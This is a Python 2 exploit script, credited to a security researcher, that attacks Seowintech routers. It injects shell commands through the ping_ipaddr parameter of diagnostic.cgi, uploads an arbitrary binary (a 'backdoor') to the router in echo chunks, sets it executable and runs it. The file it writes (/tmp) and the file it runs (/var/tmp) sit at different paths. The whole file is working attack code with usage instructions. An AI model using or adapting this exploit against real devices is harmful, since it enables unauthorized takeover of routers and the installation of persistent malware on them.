#!/usr/bin/python2
# coding: utf-8
# Author: Darren Martyn, Xiphos Research Ltd.
# Version: 20150425.1
# Licence: WTFPL - wtfpl.net
import sys
import requests
import time
from progressbar import ProgressBar

# globals
__version__ = "20150425.1"
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; 32bit; rv:10.0) Gecko/20100301 Firefox/10.0)'}

def banner():
    print """\x1b[1;32m
███████╗███████╗ ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗ 
██╔════╝██╔════╝██╔═████╗██║    ██║████╗  ██║██╔════╝██╔══██╗
███████╗█████╗  ██║██╔██║██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║
╚════██║██╔══╝  ████╔╝██║██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║
███████║███████╗╚██████╔╝╚███╔███╔╝██║ ╚████║███████╗██████╔╝
╚══════╝╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝ 
Exploit for Seowintech Routers, CVE-?. Version: %s\x1b[0m""" %(__version__)

def usage(progname):
    print "usage: %s <target ip:port> <binary to upload/execute>" %(progname)
    print "eg: %s http://target.com:8080 executable.bin" %(progname)
    sys.exit(0)

def gen_shellcode(binaryfile):
    tmp = open(binaryfile, "rb").read()
    shellcode = ''.join(["\\x%.2x" % ord(byte) for byte in tmp])
    return shellcode

def up_shell(shellcode, target):
    haxurl = target + "/cgi-bin/diagnostic.cgi?select_mode_ping=on&ping_ipaddr=-q -s 0 127.0.0.1;INSERTCODE;&ping_count=1&action=Apply&html_view=ping"
    n = 700
    blobs = [shellcode[i:i+n] for i in range(0, len(shellcode), n)]
    num_blobs = len(blobs)
    idx = 1
    print "\x1b[1;31m{+} Uploading our backdoor...\x1b[0m"
    print "\x1b[1;31m{*} Backdoor is in %d chunks...\x1b[0m" %(num_blobs)
    pbar = ProgressBar(maxval=num_blobs+1).start()
    for blob in blobs:
        if idx == 1:
            cmd = "echo -ne '%s' > /tmp/silverlords.bin" %(blob)
        else:
            cmd = "echo -ne '%s' >> /tmp/silverlords.bin" %(blob)
        url = haxurl.replace("INSERTCODE", cmd)
        hax = requests.get(url=url, headers=headers)
        pbar.update(idx+1)
        idx += 1
    pbar.finish()
    pwnurl1 = haxurl.replace("INSERTCODE", "chmod 777 /var/tmp/silverlords.bin")
    print "\x1b[1;31m{+} Setting execute bit...\x1b[0m"
    pwn1 = requests.get(url=pwnurl1, headers=headers)
    pwnurl2 = haxurl.replace("INSERTCODE", "/var/tmp/silverlords.bin")
    print "\x1b[1;31m{+} Executing Payload...\x1b[0m"
    pwn2 = requests.get(url=pwnurl2, headers=headers)

def main(args):
    banner()
    if len(sys.argv) != 3:
        usage(sys.argv[0])
    up_shell(shellcode=gen_shellcode(binaryfile=sys.argv[2]), target=sys.argv[1])

if __name__ == "__main__":
    main(sys.argv)
